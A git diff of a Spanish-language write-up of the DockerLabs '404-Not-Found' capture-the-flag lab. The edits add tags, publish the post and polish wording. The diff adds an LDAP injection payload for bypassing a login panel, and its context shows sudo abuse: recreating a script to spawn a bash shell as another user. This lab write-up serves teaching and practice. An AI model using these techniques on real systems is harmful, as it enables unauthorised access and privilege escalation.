@@ -4,11 +4,10 @@ summary: "Write-up del laboratorio 404-Not-Found de DockerLabs"
 author: elcybercurioso
 date: 2026-01-11
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, subdomain enumeration, ldap, credentials leaking, sudo, permissions abuse]
 media_subpath: "/assets/img/posts/dockerlabs_404-not-found"
 image:
   path: main.webp
-published: false
 ---
 
 ## nmap
@@ -116,7 +115,7 @@ Si accedemos a este subdominio, veremos que nos encontraremos con un panel de au
 
 ![Desktop View](/20260106114234.webp){: width="972" height="589" .shadow}
 
-Si proporcionamos credenciales erróneas, veremos que nos indica el siguiente mensaje de error:
+Proporcionando credenciales erróneas, veremos que indica el siguiente mensaje de error:
 
 ![Desktop View](/20260106114734.webp){: width="972" height="589" .shadow}
 
@@ -128,7 +127,11 @@ Siendo ese el caso, nos dirigimos a [HackTricks](https://book.hacktricks.wiki/en
 
 ![Desktop View](/20260106115400.webp){: width="972" height="589" .shadow}
 
-Si vamos probando, llegaremos a uno que permitirá saltarnos este panel:
+Si vamos probando los diferentes payloads que nos ofrecen, llegaremos a uno que nos permitirá bypassear este panel:
+
+```bash
+*)(|(password=*
+```
 
 ![Desktop View](/20260106115335.webp){: width="972" height="589" .shadow}
 
@@ -160,7 +163,7 @@ root:x:0:0:root:/root:/bin/bash
 
 ## movimiento lateral (200-ok)
 
-En los permisos SUDO del usuario `404-page`, veremos que nos indica que podemos ejecutar el script `/home/404-page/calculator.py` como el usuario `200-ok`:
+En los permisos SUDO del usuario `404-page`, veremos que nos indican que podemos ejecutar el script `/home/404-page/calculator.py` como el usuario `200-ok`:
 
 ```bash
 404-page@f91d1350e6b6:~$ sudo -l
@@ -172,15 +175,14 @@ User 404-page may run the following commands on f91d1350e6b6:
     (200-ok : 200-ok) /home/404-page/calculator.py
 ```
 
-Los permisos del script `/home/404-page/calculator.py` nos indica que solo podemos ejecutar este script:
+En los permisos del script `/home/404-page/calculator.py` podemos ver que se nos permite únicamente ejecutar este script:
 
 ```bash
 404-page@f91d1350e6b6:~$ ls -la /home/404-page/calculator.py
 -rwx--x--x 1 200-ok 200-ok 784 Aug 19  2024 /home/404-page/calculator.py
 ```
 
-
-Sin embargo, debido a que se encuentra en la carpeta principal del usuario `404-page`, podemos borrarlo y volver a crearlo, ya que los permisos de la carpeta prevalecen a los del propio fichero:
+Sin embargo, debido a que se encuentra dentro de la carpeta principal del usuario `404-page`, podemos borrarlo y volver a crearlo (los permisos de la carpeta nos permiten crear y eliminar ficheros):
 
 ```bash
 404-page@f91d1350e6b6:~$ rm /home/404-page/calculator.py
@@ -193,7 +195,7 @@ calculator.py
 -rw-rw-r-- 1 404-page 404-page 0 XXX  X XX:XX calculator.py
 ```
 
-Ya que ahora tenemos permisos para modificar el script, indicamos las instrucciones que se encarguen de invocarnos una consola a la hora de ejecutarlo, ya que si lo ejecutamos con los permisos del usuario `200-ok`, obtendremos una consola como dicho usuario.
+Ahora que tenemos permisos para modificar el script, indicamos las instrucciones que se encarguen de invocarnos una consola a la hora de ejecutarlo, ya que si lo ejecutamos con los permisos del usuario `200-ok`, obtendremos una consola como dicho usuario.
 
 Primero le volvemos a dar permisos de ejecución al script, para poder ejecutarlo tal y como se indica en los permisos SUDO, y luego indicamos las instrucciones en Python:
 
@@ -202,7 +204,7 @@ Primero le volvemos a dar permisos de ejecución al script, para poder ejecutarl
 404-page@f91d1350e6b6:~$ echo -ne '#!/usr/bin/python3\nimport os\nos.system("/bin/bash")\n' > calculator.py 
 ```
 
-Si ahora procedemos a ejecutar el script, deberíamos obtener la consola como el usuario `200-ok`:
+Si ahora ejecutamos el script, obtenendremos la consola como el usuario `200-ok`:
 
 ```bash
 404-page@f91d1350e6b6:~$ sudo -u 200-ok /home/404-page/calculator.py
